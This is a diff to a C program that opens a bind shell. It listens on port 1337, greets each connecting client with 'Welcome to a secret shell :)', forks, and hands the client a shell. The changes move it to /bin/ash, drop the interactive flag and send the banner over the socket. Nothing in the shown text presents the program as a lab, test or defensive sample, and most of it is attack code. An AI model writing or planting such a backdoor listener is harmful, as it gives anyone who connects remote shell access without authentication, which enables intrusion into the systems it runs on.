@@ -7,18 +7,18 @@
 #include <arpa/inet.h>
 #include <stdbool.h>
 #include <fcntl.h>
+#include <string.h>
 
 #define handle_error(msg, rc) do{ perror(msg); result=rc; goto l_cleanup; } while (0)
 #define arr_length(arr) sizeof(arr) / sizeof(arr[0])
 
 #define LISTENING_PORT (1337)
-#define SHELL_PATH ("/bin/sh")
-#define WELCOME_BANNER ("Welcome to a secret shell :)")
+#define SHELL_PATH ("/bin/ash")
+#define WELCOME_BANNER ("Welcome to a secret shell :)\n")
 
 #define MAX_LISTEN (5)
 #define FORK_FAILED (-1)
 #define FORK_CHILD_PROCESS (0)
-#define INTERACTIVE_SHELL_FLAG ("-i")
 
 typedef enum return_code_e{
     RC_UNINITIAILIZED = -1,
@@ -87,9 +87,7 @@ return_code_t start_shell(int32_t client_socket)
         }
     }
 
-    printf("%s\n", WELCOME_BANNER);
-
-    execl(SHELL_PATH, SHELL_PATH, INTERACTIVE_SHELL_FLAG, (char *)NULL);
+    execl(SHELL_PATH, SHELL_PATH, (char *)NULL);
     // exec shouldn't return unless an error has occured.
     handle_error("Execl failed", RC_EXEC_FAILED);
 
@@ -113,6 +111,8 @@ return_code_t handle_new_connection(int32_t server_socket)
     }
     client_port = ntohs(client_address.sin_port);
     printf("New shell connection:, IP: %s, port: %d\n", inet_ntoa(client_address.sin_addr), client_port);
+
+    send(client_socket, WELCOME_BANNER, strlen(WELCOME_BANNER), 0);
 
     fork_result = fork();
     switch (fork_result)
